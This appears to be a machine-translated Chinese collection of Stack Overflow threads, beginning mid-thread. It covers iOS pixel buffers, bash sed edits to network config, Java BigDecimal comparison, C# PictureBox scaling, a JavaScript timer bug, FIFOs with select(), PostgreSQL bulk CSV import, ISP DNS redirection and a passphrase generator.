> 赞同：1
> 
> 时间：2013-01-25T01:49:29.490

如果`CVPixelBufferCreate`您要`CVPixelBufferRef`与 OpenGL 一起使用，请使用。与替代方案不同，它为您创建了一个 iosurface `WithBytes`。缺点是您不能重用现有的缓冲区。您必须将现有缓冲区中的数据复制到新分配的缓冲区中。

```
// set pixel buffer attributes so we get an iosurface
NSDictionary *pixelBufferAttributes = [NSDictionary dictionaryWithObjectsAndKeys:
                                       [NSDictionary dictionary], kCVPixelBufferIOSurfacePropertiesKey,
                                       nil];

// create planar pixel buffer
CVPixelBufferRef pixelBuffer = nil;
CVPixelBufferCreate(kCFAllocatorDefault, bufferYUV.width, bufferYUV.height, kCVPixelFormatType_420YpCbCr8BiPlanarFullRange, (CFDictionaryRef)pixelBufferAttributes, &pixelBuffer);

// lock pixel buffer
CVPixelBufferLockBaseAddress(pixelBuffer, 0);

// get image details
size_t width = CVPixelBufferGetWidth(pixelBuffer);
size_t height = CVPixelBufferGetHeight(pixelBuffer);

// get plane addresses
unsigned char *baseAddressY  = CVPixelBufferGetBaseAddressOfPlane(pixelBuffer, 0);
unsigned char *baseAddressUV = CVPixelBufferGetBaseAddressOfPlane(pixelBuffer, 1);

//TODO: copy your data buffers to the newly allocated memory locations

// unlock pixel buffer address
CVPixelBufferUnlockBaseAddress(pixelBuffer, 0);

// intialize buffers if not already initialized (see GLCameraRipple example)
if (!_buffersInitialized)
{
    [self initializeBuffersWithTextureWidth:width textureHeight:height];
}

// always clean up last textures
CVReturn err;
[self cleanUpTextures];

// Y-plane
glActiveTexture(GL_TEXTURE0);
err = CVOpenGLESTextureCacheCreateTextureFromImage(kCFAllocatorDefault, _videoTextureCache, pixelBuffer, NULL, GL_TEXTURE_2D, GL_RED_EXT, width, height, GL_RED_EXT, GL_UNSIGNED_BYTE, 0, &_lumaTexture);
if (err)
{
    NSLog(@"Could not create Y texture from image. %d", err);
}

glBindTexture(CVOpenGLESTextureGetTarget(_lumaTexture), CVOpenGLESTextureGetName(_lumaTexture));
glTexParameterf(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_CLAMP_TO_EDGE);
glTexParameterf(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_CLAMP_TO_EDGE);

// UV-plane
glActiveTexture(GL_TEXTURE1);
err = CVOpenGLESTextureCacheCreateTextureFromImage(kCFAllocatorDefault, _videoTextureCache, pixelBuffer, NULL, GL_TEXTURE_2D, GL_RG_EXT, width / 2, height / 2, GL_RG_EXT, GL_UNSIGNED_BYTE, 1, &_chromaTexture);
if (err)
{
    NSLog(@"Could not create UV texture from image. %d", err);
}

glBindTexture(CVOpenGLESTextureGetTarget(_chromaTexture), CVOpenGLESTextureGetName(_chromaTexture));
glTexParameterf(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_CLAMP_TO_EDGE);
glTexParameterf(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_CLAMP_TO_EDGE); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-02-25T06:44:37.887

我没有在 YUV 上尝试以下方法，但它适用于 RGB 情况

[https://developer.apple.com/library/ios/qa/qa1781/_index.html](https://developer.apple.com/library/ios/qa/qa1781/_index.html)

如果启用了 ARC，则在 CFDictionaryRef 之前添加 __bridge。

# c# - 使用字符串作为路径打开网络上的 PC 目录

> ID：12646275
> 
> 赞同：0
> 
> 时间：2012-09-28T19:36:06.317
> 
> 标签：c#, networking, path, directory

我的 Windows 应用程序只是让用户（部门老板）选择他们想要导航到我们网络上的 PC 目录。每个计算机名称都有一个相应的 ID 标签。例如，如果我想打开会计的 C 盘，我会在标记为 selectPC 的组合框中选择“会计的 PC”。然后我根据他们的选择设置 ID 标签（例如，让我们说它的“ipx-12345”）并在文本框中显示 ID 标签（用于视觉验证）。我想在我的 Windows 资源管理器中调用路径“\\ipx-12345\c$\。请注意，路径将根据他们在组合框中选择的 PC 而改变）我将如何使用 ID 标签中的文本框？

```
 //snippet of condition that sets the textbox's value to the ID tag of the PC chosen
  // in combo box named 'selectPC'

  if (selectPC.Text == ("Account's PC"))
            pcID.Text = "IPX-12345"; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T20:09:24.173

你是如何填充这个组合框的？如果数据来自数据库（DataSet、BindingSource 等...），您可以使用组合框的 DataSource、DisplayMember 和 ValueMember。如果您不使用数据库，并且依赖于数据列表，则可以实现如下所示：

```
Dictionary<string, string> Data = new Dictionary<string,string>();
Data.Add("Acount1", @"\\ics#$1\");
Data.Add("Acount2", @"\\ics#$2\");
Data.Add("Acount3", @"\\ics#$3\");
Data.Add("Acount4", @"\\ics#$4\");

comboBox1.DataSource = new BindingSource(Data, null);
comboBox1.DisplayMember = "Key";
comboBox1.ValueMember = "Value"; 
```

因此，要自动选择 Combobox 中的项目，可以根据组合框 SelectedValue 属性中的 ID 获取结果。

```
combobox1.SelectedValue 
```

# spotify - Spotify 应用程序教程不起作用。缺少依赖项：与 api（0.2.3 版）兼容的框架不存在

> ID：12646276
> 
> 赞同：0
> 
> 时间：2012-09-28T19:36:14.317
> 
> 标签：spotify

我刚刚开始了 Spotify 应用程序教程（显然是用于开发 Spotify 应用程序），但不幸的是无法使其正常工作。作为参考，这是我遵循的步骤（来自[https://github.com/spotify/apps-tutorial](https://github.com/spotify/apps-tutorial)）

1.  在 Spotify 上注册开发者帐户
2.  打开终端，`mkdir ~/Spotify`
3.  `cd ~/Spotify`
4.  `git clone git@github.com:spotify/apps-tutorial.git`
5.  下载最新版本的 Spotify
6.  打开 Spotify 并`spotify:app:tutorial`在搜索栏中输入

我已完成所有这些步骤，但当我搜索 时`spotify:app:tutorial:`，我收到以下消息：

```
Missing Dependencies
Framework compatible with api (version 0.2.3) does not exist 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-30T19:30:23.713

上周五进行了一次更改，意外破坏了 API。它现在已修复并且工作正常。

# bash - 如何使用 Bash 脚本将测试发送到特定行

> ID：12646278
> 
> 赞同：1
> 
> 时间：2012-09-28T19:36:22.557
> 
> 标签：bash, networking, terminal, raspberry-pi

我知道还有其他关于此的帖子，但我无法让它们中的任何一个工作。我的问题是我想在我的 rpi 上创建一个脚本来自动更改 wifi 网络并在静态和 dhcp 之间更改 eth0。它还没有完成我目前只在无线部分工作。但到目前为止的剧本是……

```
#!/bin/bash
ANS=''
ssid=''
psk=''
file='/etc/network/interfaces'

function wireless {
    echo 'The wireless network '$ssid' has now been set up'
    start
}
function ssid {
    echo 'What is your Network SSID?'
    echo -e '> \c'
    read ssid
    echo 'You entered '$ssid'. Is this correct? (y/n)'
    echo -e '> \c'
    read ANS
    if [ $ANS = 'y' ]; then
        psk
    else
        echo 'Please renter your SSID'
        ssid
    fi
}
function psk {
    echo 'What is your Network PSK?'
    echo -e '> \c'
    read psk 
    echo 'You entered '$psk'. Is this correct? (y/n)'
    echo -e '> \c'
    read ANS
        if [ $ANS = 'y' ]; then
                wireless
        else
                echo 'Please renter your PSK'
                psk
        fi

}
function start {
echo 'What do you want to do?'
echo ''
echo 'Press w to set up wireless ssid and psk'
echo 'Press s to change eth0 to a static ip address'
echo 'Press d to change eth0 to a dhcp ip address'
echo ''
echo 'Or press ctrl+c to quit'
echo -e '> \c'
read ANS
if [ $ANS = 'w' ]; then
    ssid
else
    if [ $ANS = 's' ]; then
        static
    else
        if [ $ANS = 'd' ]; then
            dhcp
        fi
    fi
fi
}
#backup of /etc/network/interfaces
#auto lo
#iface lo inet loopback
#iface eth0 inet dhcp
#iface eth0 inet static
#   address ###########
#   netmask #############
#   broadcast ###########
#   gateway ##########
#
#allow-hotplug wlan0
#
#auto wlan0
#
#iface wlan0 inet dhcp
#wpa-ssid "Home Network"
#wpa-psk "psk"
start
exit 0 
```

所以这一切都很好，但是在无线功能中，我想将 psk 和 ssid 发送到 /etc/network/interfaces 的第 15 行和第 16 行。请有人告诉我最好的方法来做到这一点。谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-28T20:20:47.353

您可以使用 sed 执行自动编辑，如下所示：

```
 sed -i "s/^wpa-ssid.*\$/wpa-ssid \"$ssid\"/" /etc/network/interfaces 
```

此命令匹配任何以 wpa-ssid 开头的完整行，并将其替换为“wpa-ssid”，后跟 $ssid 变量的内容。`^wpa-ssid.*\$`是匹配模式。 `^`表示行首，`.*`表示匹配任何内容，`\$`表示行尾。 `wpa-ssid \"$ssid\"/`是什么来代替它。-i 选项意味着编辑文件，而不是将结果打印到标准输出。

psk 将以相同的方式工作。

您应该考虑让您的脚本在第一次运行时备份文件。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-28T20:18:15.533

如果我理解，您想将 /etc/network/interfaces 的第 15 行中的引用文本替换为 SSID 文本，并将第 16 行的引用文本替换为 PSK 文本。例如，

```
#wpa-ssid "Home Network"
#wpa-psk "psk" 
```

可能会更改为

```
#wpa-ssid "new-Network"
#wpa-psk "new-psk" 
```

我在您的脚本代码中没有看到您可能在哪些变量中包含新的 SSID 和 PSK 名称，但如果它们位于名为 SSID 和 PSK 以及 FILE="/etc/network/interfaces" 的变量中，您可以说：

```
sed -i "s/^#wpa-ssid.*/#wpa-ssid \"$SSID\"/; \
   s/^#wpa-psk.*/#wpa-psk \"$PSK\"/" $FILE 
```

外引号是双引号，以允许 bash 变量扩展。内部双引号用反斜杠引用。如果将 sed 命令放在一行中，请删除第一行末尾的反斜杠。此外，在尝试此操作时，请复制您的接口文件并将 FILE 设置为副本的名称；运行 sed 命令，然后将副本与原始副本进行比较以检查正确的操作。

# java - 验证值正好等于 0.00

> ID：12646281
> 
> 赞同：2
> 
> 时间：2012-09-28T19:36:26.187
> 
> 标签：java, comparison, int, double

我正在计算 java 中变量的值是否等于 0.00 ，当前定义为大十进制。

```
I have tried a variety of ways to do this including:
tempListPrice.getAmount() == 0.00;

tempListPrice.getAmount().equals(0.00);

public static final zeroed = 0.00
tempListPrice.getAmount().equals(zeroed); 
```

请记住，我已经做了很多谷歌搜索，试图找到一种简单的方法来比较这个。如何比较 的值`tempListPrice`以查看它是否等于`0.00`，这在前面定义为 a `big decimal datatype`。

我该怎么做呢？（对不起，我对 Java 很陌生）。

谢谢

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-09-28T19:38:11.523

好的，经过进一步研究，您将需要 equals 或 compareTo。你可能想要

```
tempListPrice.getAmount().compareTo(BigDecimal.ZERO); 
```

或者

```
tempListPrice.getAmount().equals(BigDecimal.ZERO); 
```

但老实说，需要决定哪个更适合您的程序的语义。请记住，这很棘手的原因是因为浮点数实际上并没有完全相等的概念，它们本质上是模糊的、近似的实体。您需要仔细检查您的代码，以确保这对您的情况有效。

无论如何，Javadoc 中的以下几点应该足以让您决定：

> (equals) 将此 BigDecimal 与指定的 Object 进行比较是否相等。与 compareTo 不同，此方法仅当两个 BigDecimal 对象的值和比例相等时才认为它们相等（因此，通过此方法进行比较时，2.0 不等于 2.00）。

参看。

> (compareTo) 将此 BigDecimal 与指定的 BigDecimal 进行比较。此方法认为两个值相等但比例不同（如 2.0 和 2.00）的 BigDecimal 对象是相等的。此方法优先于六个布尔比较运算符（<、==、>、>=、!=、<=）中的每一个的单独方法提供。执行这些比较的建议习惯用法是：(x.compareTo(y) 0)，其中 是六个比较运算符之一。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-28T19:44:18.540

```
BigDecimal val = new BigDecimal("0.00");

BigDecimal test = new BigDecimal("0.00");

boolean isEqual = val.equals(test);

System.out.println("val " + val.toString() + " test " + test + " comp = " + isEqual); 
```

输出

val 0.00 测试 0.00 comp = true

```
BigDecimal val = new BigDecimal("0.000");

BigDecimal test = new BigDecimal("0.00");

boolean isEqual = val.equals(test);

System.out.println("val " + val.toString() + " test " + test + " comp = " + isEqual); 
```

输出

val 0.000 测试 0.00 comp = 假

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-30T16:17:32.250

正如先前的答案所指出的，您需要确保所描述的方法满足您的要求。如果，正如变量名所暗示的那样，您将货币金额与零进行比较，则另一种方法可能是将金额存储为两个 int 变量，如下所示（假设为美元，但可以是任何其他货币）：

```
public boolean isZero (int dollars, int cents) {
    return (dollars == 0 && cents == 0);
} 
```

简而言之，您的目的是否需要 BigDecimal 变量？

# c# - 图片框的图像缩放

> ID：12646287
> 
> 赞同：29
> 
> 时间：2012-09-28T19:37:15.790
> 
> 标签：c#, image, image-scaling

我在 C# 中遇到了图像缩放问题。

我有一个给定尺寸的图片框：例如宽度 = 800px 高度 = 600px

我正在将不同的图像加载到该图片框中，小的（400x400）和大的（800+ x 600+）

如果它们不适合盒子，我的图像会被调整大小。但它们*总是*被调整为 PictureBox 的最大宽度和高度。所以纵横比被*破坏了*。

任何人都可以帮助识别/解决问题吗？

**课程：**

[Form1.cs](http://pastie.org/private/nlpczwuokemq4jwedulw)

[ImageHandling.cs](http://pastie.org/private/0fjxxktybiafuwu2glg0a)（注释掉）

[ImageUtilities.cs](http://pastie.org/private/7h40w2eg5wvja8uohhyflq)

**例子：**

问题 1：我的版本
![在此处输入图像描述](../Images/bdb44e8b47bf0b1e9f7c6150c205872e.png)

与原始来源![在此处输入图像描述](../Images/c0d2591ba339fc79ab7a976073c8478f.png)

问题 2：
我的版本
![在此处输入图像描述](../Images/c7ec77401f903443654fe0ac064779fd.png)

与原始来源
![在此处输入图像描述](../Images/0a6cf7e18ad46f647ddd3e8f70eddc8c.png)

**我想要它：**

解决方案
![在此处输入图像描述](../Images/4766eb94cb2035f2d86da1a71a3a9a0a.png)

* * *

## 回答 #1

> 赞同：58
> 
> 时间：2012-09-28T19:40:48.327

```
this.PictureBox1.SizeMode = PictureBoxSizeMode.Zoom; 
```

将该属性设置为您的 PictureBox 并且图像的大小将增加或减小以适合 PictureBox 保持大小比例。

欲了解更多信息：http: [//msdn.microsoft.com/en-us/library/system.windows.forms.picturebox.sizemode.aspx](http://msdn.microsoft.com/en-us/library/system.windows.forms.picturebox.sizemode.aspx)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2022-01-07T16:46:06.867

我通过在 PictureBox 的 resize 方法上重置 SizeMode 来处理这个问题。

这基本上与上面的答案相同，但它的格式要好得多。

```
private void ScaleImage()
{
  if (pbInfo.Image == null)
    return;

  if (pbInfo.Image.Width > pbInfo.Width || pbInfo.Image.Height > pbInfo.Height)
    pbInfo.SizeMode = PictureBoxSizeMode.Zoom;
  else
    pbInfo.SizeMode = PictureBoxSizeMode.Normal;
} 
```

# widget - 获取 wxwidget 的绑定事件？

> ID：12646296
> 
> 赞同：0
> 
> 时间：2012-09-28T19:37:48.297
> 
> 标签：widget, wxpython, wxwidgets, wxperl

我希望能够确定绑定到特定 wxwidget 事件的所有方法。

我正在动态绑定我的事件。有没有办法确定哪些方法绑定到了我的 wxwidget 可用的每个事件类型，只需要对小部件的引用？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-01T14:22:31.567

根据此线程，wxPython 无法公开该信息：[http ://www.mentby.com/Group/wxpython-users/where-isare-the-bind-ings-lists-stored.html](http://www.mentby.com/Group/wxpython-users/where-isare-the-bind-ings-lists-stored.html)

相反，Robin Dunn（wxPython 的作者）建议覆盖 Bind 并以这种方式存储信息，或者改用 PubSub。

# javascript - 倒计时计时器加速

> ID：12646298
> 
> 赞同：2
> 
> 时间：2012-09-28T19:38:02.053
> 
> 标签：javascript

我有一个每秒倒计时的计时器。计时器用于游戏：用户最多有 15 秒的时间来回答问题。假设游戏有 10 个问题。计时器非常适合第一个问题，但随后，每个问题都会越来越快。任何建议都更受欢迎。谢谢！

代码在这里：

```
var timeInSecs;
var ticker;
function startTimer(secs) {
    timeInSecs = secs;
    ticker = setInterval("tick()", 1000); // every second
}
function tick() {
    var seconds = timeInSecs;
    if (seconds > 0) {
        timeInSecs--;
    }
    else if (seconds == 0) {
        document.getElementById("timeExpired").innerHTML = "Time expired!";
    }
    document.getElementById("countDown").innerHTML = seconds;
}
function myStopFunction() {
    clearInterval(ticker);
}​ 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-28T19:42:44.177

```
else if(seconds==0)
        {
            // you should stop the timer here, and clear the interval
            myStopFunction();
            document.getElementById("timeExpired").innerHTML = "Time expired!";
        } 
```

编辑：附注

最好将函数传递`tick`给区间，而不是要评估的字符串。使用 eval 通常是一件危险的事情，而且效率较低。

```
setInterval(tick, 1000) 
```

编辑：另一个旁注

您可以更简洁地编写 tick 函数（并且没有额外的变量`seconds`）

```
 function tick(){
        document.getElementById("countDown").innerHTML = timeInSecs;
        if(! timeInSecs--){
            myStopFunction()                
            document.getElementById("timeExpired").innerHTML = "Time expired!";
        }
    } 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-23T03:28:08.587

我认为您应该在函数中使用变量`second`而不是`timeInSeconds`-- 。`tick()`

因为你给了`timeInSeconds`to的值`seconds`。也许这会有所帮助。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-28T19:56:21.743

我认为您在达到 0 时不会清除间隔。

您定义`myStopFUnction()`但可能永远不会在秒 == 0 时调用它。

尝试：

```
else if (seconds == 0) {
    document.getElementById("timeExpired").innerHTML = "Time expired!";
    myStopFunction();
} 
```

此外，您应该使用`===`

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-29T00:15:50.590

```
var timeInSecs;
var ticker;
function startTimer(secs) 
{
    timeInSecs = secs;
}

function tick() {
    var seconds = timeInSecs;
    if (seconds > 0) 
      timeInSecs--;
    else if (seconds == 0) 
    {
        document.getElementById("timeExpired").innerHTML = "Time expired!";
    }
    document.getElementById("countDown").innerHTML = seconds;
    ticker = setInterval("tick()", 1000); // every second
}

function myStopFunction() 
{
    clearInterval(ticker);
} ​ 
```

# c - 无法理解 select() 系统调用

> ID：12646301
> 
> 赞同：3
> 
> 时间：2012-09-28T19:38:10.240
> 
> 标签：c, linux, posix, file-descriptor, fifo

我正在使用 FIFO 和`select()`系统命令运行测试。这个想法是：

1.  `select()`进程一应该使用命令休眠等待来自 FIFO 的消息
2.  如果没有消息进来，进程应该每 5 秒唤醒一次并说“还没有”
3.  如果有消息进来，它应该唤醒，打印消息，然后终止

所以这里是代码**注意**我正在取出错误检查以节省空间：

```
//process 1's code
int main()
{
  int fd, ret;
  fd_set rfds;
  char buffer[100] = {0}; 
  char * myfifo = "/tmp/myfifo";
  struct timeval tv;

  tv.tv_sec = 5;  // 5 second sleep
  tv.tv_usec = 0;

  mkfifo(myfifo, 0666); //Make the fifo

  fd = open(myfifo, O_RDONLY);
  FD_ZERO(&rfds);    // clear the flags
  FD_SET(fd, &rfds); // set "read" on fd

  while((ret = select(fd+1, &rfds, NULL, NULL, &tv)) <= 0) //should be 1 when we're ready to read
  {
     FD_ZERO(&rfds);     //I believe we should clear/reset these every time?
     FD_SET(fd, &rfds);
     printf("Nothing yet...%d\n",ret);
     fflush(stdout);
  }
  n = read(fd, buffer, 100);
  printf("I got a read of %d bytes\nIt was %s\n",n, buffer);

  unlink(myfifo);

  return 0;
} 
```

一旦我启动并运行了进程 1，我等待了 10 秒，然后我启动了进程 2：

```
//Process 2's code
int main()
{
  int fd, n, ret;
  fd_set rfds;
  char buffer[100] = {0};
  char * myfifo = "/tmp/myfifo";
  fd = open(myfifo, O_WRONLY);

  printf("What would you like to send?\n");
  fgets(buffer, 100, stdin);
  write(fd, buffer, strlen(buffer));

  close(fd);
  return 0;
} 
```

我期待看到类似的东西：

```
Nothing yet...0
Nothing yet...0
I got a read of X bytes
It was <some string> 
```

相反，我什么也看不到，直到我输入一些内容并为进程二按回车键，进程一正确返回字符串......但为什么循环不打印消息？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-28T20:00:49.533

人选：

> 在 Linux 上， select() 修改超时以反映未睡觉的时间量；大多数其他实现不这样做。（POSIX.1-2001 允许任何一种行为。）

因此，您应该在循环内重新初始化 tv 。但这不是您的问题的原因。原因是：

男人 mkfifo：

> 打开一个 FIFO 进行读取通常会阻塞，直到某个其他进程打开同一个 FIFO 进行写入，反之亦然。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-29T13:36:56.027

当您在 Linux 上时，您可能希望添加`O_NONBLOCK`到`open()`读者端的调用中。详情请参阅`man 7 fifo`。

# python - 将大量 csv 文件导入 PostgreSQL 数据库的有效方法

> ID：12646305
> 
> 赞同：9
> 
> 时间：2012-09-28T19:38:21.773
> 
> 标签：python, csv, import, postgresql-9.1

我看到很多将 CSV 导入 PostgreSQL 数据库的示例，但我需要一种将 500,000 个 CSV 导入单个 PostgreSQL 数据库的有效方法。每个 CSV 略多于 500KB（总计大约 272GB 的数据）。

CSV 的格式相同，并且没有重复记录（数据是从原始数据源以编程方式生成的）。我一直在搜索并将继续在网上搜索选项，但我将不胜感激以最有效的方式完成此任务的任何方向。我确实有一些使用 Python 的经验，但会深入研究任何其他似乎合适的解决方案。

谢谢！

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-09-29T10:23:07.537

如果您从阅读[PostgreSQL 指南“填充数据库”](http://www.postgresql.org/docs/current/interactive/populate.html)开始，您会看到几条建议：

1.  在单个事务中加载数据。
2.  `COPY`尽可能使用。
3.  在加载数据之前删除索引、外键约束等，然后再恢复它们。

PostgreSQL 的[`COPY`语句](http://www.postgresql.org/docs/current/interactive/sql-copy.html)已经支持 CSV 格式：

```
COPY table (column1, column2, ...) FROM '/path/to/data.csv' WITH (FORMAT CSV) 
```

所以看起来你最好不要使用 Python，或者只使用 Python 来生成所需的`COPY`语句序列。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-28T20:24:35.040

你那里有大量的数据。我不是 100% 确定 Postgre，但至少 MySQL 提供了一些 SQL 命令，将 csv 直接输入到表中。这绕过了任何插入检查等，这就是为什么比任何普通插入操作快一个数量级以上。

因此，可能最快的方法是创建一些简单的 python 脚本，告诉你的 postgre 服务器，哪些 csv 文件以何种顺序贪婪地吞噬它的无穷无尽的表格。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-10-18T13:13:34.300

我使用 php 和 postgres，并使用 php 读取 csv 文件并使用以下格式的字符串：

```
{ {line1 column1, line1 column2, line1 column3} , { line2 column1,line2 column2,line2 column3} } 
```

通过将字符串参数传递给 postgresql 函数来关心单个事务。

我可以检查所有记录、格式、数据量等，大约3分钟就可以得到导入500,000条记录的结果。

在 postgresql 函数中读取数据：

```
 DECLARE
     d varchar[];
 BEGIN

     FOREACH d SLICE 1 IN ARRAY p_dados
     LOOP

     INSERT INTO schema.table (
       column1,
       column2,
       column3,
     )
     VALUES ( 
       d[1],
       d[2]::INTEGER, -- explicit conversion to INTEGER
       d[3]::BIGINT, -- explicit conversion to BIGINT
     );        
     END LOOP;

  END; 
```

# php - 即使网站为假，通过检查 CURLINFO_HTTP_CODE 来测试网站是否已启动也会返回 200

> ID：12646312
> 
> 赞同：3
> 
> 时间：2012-09-28T19:38:48.030
> 
> 标签：php, curl

我正在运行 EasyPHP 和 PHP5 的 Windows 7 机器上测试此代码片段，当我运行代码时它仍然返回代码 200，我使用的是不存在的 url，所以它不应该，应该吗？这是因为重定向发生在例如[http://www.123-reg.co.uk](http://www.123-reg.co.uk)吗？这就是我的怀疑，但我正在努力寻找如何解决这个问题。

```
$url = "http://www.bnkbkvbirbcx.co.uk";
$ch = curl_init(); 
curl_setopt($ch, CURLOPT_URL, $url); 
curl_setopt($ch, CURLOPT_HEADER, TRUE); 
curl_setopt($ch, CURLOPT_NOBODY, TRUE);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, FALSE);
$hr = curl_exec($ch); 
$httpreturncode = curl_getinfo($ch, CURLINFO_HTTP_CODE); 
curl_close($ch);
echo $httpreturncode; 
```

插入 var_dump($hr, curl_getinfo($ch)) 会产生这个输出；

```
string 'HTTP/1.1 200 OK

Date: Fri, 28 Sep 2012 20:18:16 GMT

Server: Apache

Cache-control: no-cache, no-store

Expires: Thu, 01 Jan 1970 00:00:00 GMT

Pragma: no-cache

Connection: close

Content-Type: text/html; charset=UTF-8

' (length=224)

array
'url' => string 'http://www.bnkbkvbirbcx.co.uk' (length=29)
'content_type' => string 'text/html; charset=UTF-8' (length=24)
'http_code' => int 200
'header_size' => int 224
'request_size' => int 62
'filetime' => int -1
'ssl_verify_result' => int 0
'redirect_count' => int 0
'total_time' => float 0.063
'namelookup_time' => float 0.016
'connect_time' => float 0.031
'pretransfer_time' => float 0.031
'size_upload' => float 0
'size_download' => float 0
'speed_download' => float 0
'speed_upload' => float 0
'download_content_length' => float -1
'upload_content_length' => float 0
'starttransfer_time' => float 0.063
'redirect_time' => float 0
'certinfo' => 
array
  empty
'redirect_url' => string '' (length=0) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-29T07:54:55.090

好吧，我终于明白了这一点，我觉得我花了这么长时间才愚蠢！我的 isp 确实干预了一个“方便的功能”，如下所示：“如果您输入的地址没有找到站点，这个方便的功能会将不正确的地址转换为网络搜索，因此您将得到一个列表而不是错误消息我们最接近的比赛”。我还发现我可以选择“关闭”我所做的这个方便的功能，现在我得到了我期望的结果。感谢您的所有意见，正如您从我的一些摇摇欲坠的帖子中看出的那样，我是 stackoverflow 的新手，但发现分享我的问题很好。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-29T05:48:07.823

我想建议为您的计算机/服务器设置另一个 DNS 服务器。您的提供商似乎将不存在的域重定向到他们的主页。

我不知道您的供应商virginmedia，但德国电信有一个选项可以在他们的主页上停用此选项。

一种选择是使用像 Google 一样的开放/免费 DNS 服务器，可通过 8.8.8.8 和 8.8.4.4 访问

我希望这会有所帮助！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-11-18T18:07:02.750

下面的脚本可能对在此处结束搜索的人有所帮助。

fakePhrase 用于检测 ISP“搜索辅助”广告软件 HTTP 响应。

```
#!/bin/bash

fakePhrase="verizon"
siteList=(
  'http://google.com'
  'https://google.com'
  'http://wikipedia.org'
  'https://wikipedia.org'
  'http://cantgettherefromhere'
  'http://searchassist.verizon.com'
)

exitStatus=0

function isUp {
  http=`curl -sL -w "%{http_code}" "$1" -o temp_isUp`
  fakeResponse=`cat temp_isUp | grep $fakePhrase`
  if [ -n "$fakeResponse" ]; then
    http=$fakePhrase
  fi
  case $http in
  [2]*)
    ;;
  [3]*)
    echo 'Redirect'
    ;;
  [4]*)
    exitStatus=4
    echo "$1 is DENIED with ${http}"
    ;;
  [5]*)
    exitStatus=5
    echo "$1 is ERROR with ${http}"
    ;;
  *)
    exitStatus=6
    echo "$1 is NO RESPONSE with ${http}"
    ;;
  esac
}

for var in "${siteList[@]}"
do
  isUp $var
done

if [ "$exitStatus" -eq "0" ]; then
  echo 'All up'
fi

rm temp_isUp
exit $exitStatus 
```

# ios - 如何实时检索 iOS App Store 前 1000 款游戏列表

> ID：12646313
> 
> 赞同：0
> 
> 时间：2012-09-28T19:38:49.930
> 
> 标签：ios, api, charts, app-store

我想实时检索 iOS App Store 中前 1000 个应用程序（特别是游戏）的列表。此信息是公开的（至少前 300 名），但 Apple 不提供任何 API 或自动方式来获取这些列表。有人知道这方面的好服务吗？

我在下面的论坛中列出了类似的主题，以及不同的有用资源。其中大部分可以帮助您跟踪自己的应用程序，但我有兴趣关注**App Store 中所有应用程序的趋势**。

谢谢！

类似主题：

*   [如何使用 Appstore API 获取 top100 列表？搭建appstore应用网站的常用架构是什么？](https://stackoverflow.com/questions/1801182/how-can-i-use-appstore-api-to-get-top100-list-what-is-the-common-architecture-t)
*   [https://stackoverflow.com/questions/2689711/itunes-app-store-api](https://stackoverflow.com/questions/2689711/itunes-app-store-api)
*   [http://www.cocos2d-iphone.org/forum/topic/13167](http://www.cocos2d-iphone.org/forum/topic/13167)

解决方案：

*   [http://www.appfigures.com](http://www.appfigures.com)
*   [http://majicjungle.com](http://majicjungle.com)
*   [http://itunes.apple.com/rss/generator](http://itunes.apple.com/rss/generator)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-29T07:12:10.690

似乎没有记录在案的公共 API，但您（目前）仍然可以获取数据。

您可以使用 wireshark（或类似工具）来计算 Mac 或 PC 上的 iTunes 使用的 URL 序列和用户代理，以获取它在手动单击页面时显示的所有流行度排序页面。这一切（目前）都是在纯 HTTP 中完成的。您可以通过这种方式为数千个应用程序获取 100 个页面。然后解析和解码为这些 URL 返回的 XML，以获取每个页面上显示的应用名称。一堆驱动 wget 或 curl 的 perl 脚本可能会起作用。

请注意，当 Apple 更新 iTunes 时，返回的 URL、用户代理和 XML 格式经常会发生变化。因此，您需要定期重新调整您的检索机制。

# passwords - 生成强密码的工具？

> ID：12646318
> 
> 赞同：1
> 
> 时间：2012-09-28T19:39:07.417
> 
> 标签：passwords, utility, passphrase

密码短语似乎是传统强密码指南的一个很好的替代方案。请参阅[http://xkcd.com/936/](http://xkcd.com/936/)以获取有关密码与密码短语的有趣内容。

有许多工具可以生成更传统的密码（例如 pwgen）。这些工具在为用户提供良好的初始密码时很有用。

有哪些工具可用于生成好的密码？

您是否有使用它们的经验或对其安全性或其他功能的见解？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T19:39:07.417

我写了一个基于命令行的 Perl 脚本[passphrase-generator](http://sourceforge.net/projects/passphrase-gen/ "密码生成器")。

密码生成器默认只有 3 个单词，而不是 XKCD 建议的 4 个单词，但使用在 /usr/share/dict/words 的许多基于 linux 的系统中找到的更大字典。它还提供了对生成的密码短语的熵的估计。随机化基于 /dev/urandom 和 SHA1。

示例运行：

```
$ passphrase-generator 

Random passphrase generator

Entropy per passphrase is 43.2 bits (per word: 14.4 bits.)

